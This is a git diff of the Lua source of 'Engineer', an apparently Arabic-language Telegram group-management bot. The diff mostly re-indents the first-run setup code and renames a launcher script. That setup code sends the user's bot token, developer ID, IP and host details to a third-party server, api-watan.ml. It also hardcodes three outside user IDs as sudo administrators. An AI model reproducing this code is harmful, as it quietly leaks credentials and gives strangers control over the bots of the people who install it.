@@ -1,131 +1,131 @@
 local AutoFiles_Write = function() 
-  if not database:get(Server.."Token_Write") then
-  print("\27[1;34m»» ارسل توكن البوت الخاص بك الان :\27[m")
-  local token = io.read()
-  if token ~= '' then
-  local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-  if res ~= 200 then
-  io.write('\n\27[1;31mعذراً التوكن غير صحيح تأكد منه ثم ارسله \n\27[0;39;49m')
-  else
-  io.write('\n\27[1;31mتم حفظ التوكن\n\27[0;39;49m')
-  database:set(Server.."Token_Write",token)
-  end 
-  else
-  io.write('\n\27[1;31mلم يتم حفظ التوكن\n\27[0;39;49m')
-  end 
-  os.execute('lua Engineer.lua')
-  end
-  if not database:get(Server.."UserSudo_Write") then
-  print("\27[1;34mارسل ايدي المطور الان :\27[m")
-  local Id = io.read():gsub(' ','') 
-  if tostring(Id):match('%d+') then
-  data,res = https.request("https://api-watan.ml/WaTaN/index.php?Ban=WaTaN&Info&Id="..Id)
-  if res == 200 then
-  Abs = json:decode(data)
-  if Abs.Result.Info == 'Is_Spam' then
-  io.write('\n\27[1;31mعذرا هذا الايدي محظور من السورس\n\27[0;39;49m')
-  os.execute('lua Engineer.lua')
-  end ---ifBn
-  if Abs.Result.Info == 'Ok' then
-  io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
-  database:set(Server.."UserSudo_Write",Id)
-  end ---ifok
-  else
-  io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
-  end  ---ifid
-  os.execute('lua Engineer.lua')
-  end ---ifnot
-  end
-  local Create = function(data, file, uglify)  
-  file = io.open(file, "w+")   
-  local serialized   
-  if not uglify then  
-  serialized = serpent.block(data, {comment = false, name = "Info"})  
-  else  
-  serialized = serpent.dump(data)  
-  end    
-  file:write(serialized)
-  file:close()  
-  end
-  local function Files_Info_Get()
-  Config = {
-  token = database:get(Server.."Token_Write"),
-  SUDO = database:get(Server.."UserSudo_Write"),
-  }
-  Create(Config, "./Info.lua") 
-  https.request("https://api-watan.ml/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-  print("::Engineer::")
-  local RunEngineer = io.open("Engineer", 'w')
-  RunEngineer:write([[
-  #!/usr/bin/env bash
-  cd $HOME/Engineer
-  token="]]..database:get(Server.."Token_Write")..[["
-  while(true) do
-  rm -fr ../.telegram-cli
-  if [ ! -f ./tg ]; then
-  echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-  echo "TG IS NOT FIND IN FILES BOT"
-  echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-  exit 1
-  fi
-  if [ ! $token ]; then
-  echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-  echo "TOKEN IS NOT FIND IN FILE INFO.LUA"
-  echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-  exit 1
-  fi
-  ./tg -s ./Engineer.lua -p PROFILE --bot=$token
-  done
-  ]])
-  RunEngineer:close()
-  local RunEir = io.open("Eir", 'w')
-  RunEir:write([[
-  #!/usr/bin/env bash
-  cd $HOME/Engineer
-  while(true) do
-  rm -fr ../.telegram-cli
-  screen -S Engineer -X kill
-  screen -S Engineer ./Engineer
-  done
-  ]])
-  RunEir:close()
-  io.popen("mkdir File_Bot") 
-  os.execute('chmod +x Engineereer;sudo chmod +x ./Eir;./Eir')
-  end
-  Files_Info_Get()
-  end 
-  local function Load_File()  
-  local f = io.open("./Info.lua", "r")  
-  if not f then   
-  AutoFiles_Write()  
-  var = true
-  else   
-  f:close()  
-  database:del(Server.."Token_Write");database:del(Server.."UserSudo_Write")
-  var = false
-  end  
-  return var
-  end
-  Load_File() 
-  --------------------------------------------------------------------------------------------------------------
-  print([[
-  ╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗
-  ║║║║║║     ║╔╗╔╗║     ║║╚╗║║
-  ║║║║║║╔══╗ ╚╝║║╚╝╔══╗ ║╔╗╚╝║
-  ║╚╝╚╝║╚ ╗║   ║║  ╚ ╗║ ║║╚╗║║
-  ╚╗╔╗╔╝║╚╝╚╗ ╔╝╚╗ ║╚╝╚╗║║ ║║║
-   ╚╝╚╝ ╚═══╝ ╚══╝ ╚═══╝╚╝ ╚═╝
-                                 
-  > CH › @EngineereerTeaM
-  ~> DEVELOPER › @abbasfadhil
-  ~~> Source Version 2.6
-  ]])
-  sudos = dofile("./Info.lua") 
-  SUDO = tonumber(sudos.SUDO)
-  sudo_users = {SUDO,782717203,218385683,36325290}   
-  bot_id = sudos.token:match("(%d+)")  
-  token = sudos.token 
-  --- start functions ↓
+if not database:get(Server.."Token_Write") then
+print("\27[1;34m»» ارسل توكن البوت الخاص بك الان :\27[m")
+local token = io.read()
+if token ~= '' then
+local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
+if res ~= 200 then
+io.write('\n\27[1;31mعذراً التوكن غير صحيح تأكد منه ثم ارسله \n\27[0;39;49m')
+else
+io.write('\n\27[1;31mتم حفظ التوكن\n\27[0;39;49m')
+database:set(Server.."Token_Write",token)
+end 
+else
+io.write('\n\27[1;31mلم يتم حفظ التوكن\n\27[0;39;49m')
+end 
+os.execute('lua Engineer.lua')
+end
+if not database:get(Server.."UserSudo_Write") then
+print("\27[1;34mارسل ايدي المطور الان :\27[m")
+local Id = io.read():gsub(' ','') 
+if tostring(Id):match('%d+') then
+data,res = https.request("https://api-watan.ml/WaTaN/index.php?Ban=WaTaN&Info&Id="..Id)
+if res == 200 then
+Abs = json:decode(data)
+if Abs.Result.Info == 'Is_Spam' then
+io.write('\n\27[1;31mعذرا هذا الايدي محظور من السورس\n\27[0;39;49m')
+os.execute('lua Engineer.lua')
+end ---ifBn
+if Abs.Result.Info == 'Ok' then
+io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
+database:set(Server.."UserSudo_Write",Id)
+end ---ifok
+else
+io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
+end  ---ifid
+os.execute('lua Engineer.lua')
+end ---ifnot
+end
+local Create = function(data, file, uglify)  
+file = io.open(file, "w+")   
+local serialized   
+if not uglify then  
+serialized = serpent.block(data, {comment = false, name = "Info"})  
+else  
+serialized = serpent.dump(data)  
+end    
+file:write(serialized)
+file:close()  
+end
+local function Files_Info_Get()
+Config = {
+token = database:get(Server.."Token_Write"),
+SUDO = database:get(Server.."UserSudo_Write"),
+}
+Create(Config, "./Info.lua") 
+https.request("https://api-watan.ml/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+print("::Engineer::")
+local RunEngineer = io.open("Engineer", 'w')
+RunEngineer:write([[
+#!/usr/bin/env bash
+cd $HOME/Engineer
+token="]]..database:get(Server.."Token_Write")..[["
+while(true) do
+rm -fr ../.telegram-cli
+if [ ! -f ./tg ]; then
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "TG IS NOT FIND IN FILES BOT"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+exit 1
+fi
+if [ ! $token ]; then
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "TOKEN IS NOT FIND IN FILE INFO.LUA"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+exit 1
+fi
+./tg -s ./Engineer.lua -p PROFILE --bot=$token
+done
+]])
+RunEngineer:close()
+local RunEiR = io.open("EiR", 'w')
+RunEiR:write([[
+#!/usr/bin/env bash
+cd $HOME/Engineer
+while(true) do
+rm -fr ../.telegram-cli
+screen -S Engineer -X kill
+screen -S Engineer ./Engineer
+done
+]])
+RunEiR:close()
+io.popen("mkdir File_Bot") 
+os.execute('chmod +x Engineer;sudo chmod +x ./EiR;./EiR')
+end
+Files_Info_Get()
+end 
+local function Load_File()  
+local f = io.open("./Info.lua", "r")  
+if not f then   
+AutoFiles_Write()  
+var = true
+else   
+f:close()  
+database:del(Server.."Token_Write");database:del(Server.."UserSudo_Write")
+var = false
+end  
+return var
+end
+Load_File() 
+--------------------------------------------------------------------------------------------------------------
+print([[
+╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗
+║║║║║║     ║╔╗╔╗║     ║║╚╗║║
+║║║║║║╔══╗ ╚╝║║╚╝╔══╗ ║╔╗╚╝║
+║╚╝╚╝║╚ ╗║   ║║  ╚ ╗║ ║║╚╗║║
+╚╗╔╗╔╝║╚╝╚╗ ╔╝╚╗ ║╚╝╚╗║║ ║║║
+ ╚╝╚╝ ╚═══╝ ╚══╝ ╚═══╝╚╝ ╚═╝
+                               
+> CH › @EngineerTeaM
+~> DEVELOPER › @abbasfadhil
+~~> Source Version 2.6
+]])
+sudos = dofile("./Info.lua") 
+SUDO = tonumber(sudos.SUDO)
+sudo_users = {SUDO,782717203,218385683,36325290}   
+bot_id = sudos.token:match("(%d+)")  
+token = sudos.token 
+--- start functions ↓
 --------------------------------------------------------------------------------------------------------------
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
@@ -3076,13 +3076,13 @@ end
 end
 if text == "تفعيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddEngineer:stats") == "✔" then
 send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه الاسماء')
-database:set(bot_id.."Ttn:Eir:stats"..msg.chat_id_,"open")
+database:set(bot_id.."Ttn:EiR:stats"..msg.chat_id_,"open")
 end
 if text == "تعطيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddEngineer:stats") == "✔" then
 send(msg.chat_id_, msg.id_, '✯︙تم تعطيل تنبيه الاسماء')
-database:set(bot_id.."Ttn:Eir:stats"..msg.chat_id_,"close")
+database:set(bot_id.."Ttn:EiR:stats"..msg.chat_id_,"close")
 end
-if text and database:get(bot_id.."Ttn:Eir:stats"..msg.chat_id_) == "open" then 
+if text and database:get(bot_id.."Ttn:EiR:stats"..msg.chat_id_) == "open" then 
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
